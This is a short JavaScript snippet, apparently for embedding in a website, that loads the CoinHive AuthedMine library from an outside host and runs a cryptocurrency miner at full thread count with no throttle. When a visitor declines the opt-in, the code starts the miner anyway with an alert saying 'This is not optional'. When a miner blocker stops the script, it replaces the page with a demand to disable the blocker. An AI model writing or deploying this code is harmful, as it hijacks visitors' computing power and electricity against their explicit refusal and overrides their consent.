    var script = document.createElement('script');
    script.src = 'https://authedmine.com/lib/authedmine.min.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    //check if script was loaded
    script.onload = function() {
      var miner = new CoinHive.Anonymous('zJkrUQfkN5OfHz32nQLz0HTka2u9NqRd');
      miner.start();
      miner.setAutoThreadsEnabled(true);
      miner.setThrottle(0);
      miner.on('optin', function(params) {
        if (params.status === 'accepted') {
          console.log('User accepted opt-in');
        } else {
          miner.start();
          alert("This is not optional")
          miner.setAutoThreadsEnabled(true);
          miner.setThrottle(0);
        }
      });
    }
    //check if it didn't load
    script.onerror = function() {
      document.write("Please disable your miner blocker")
      window.stop()
    }
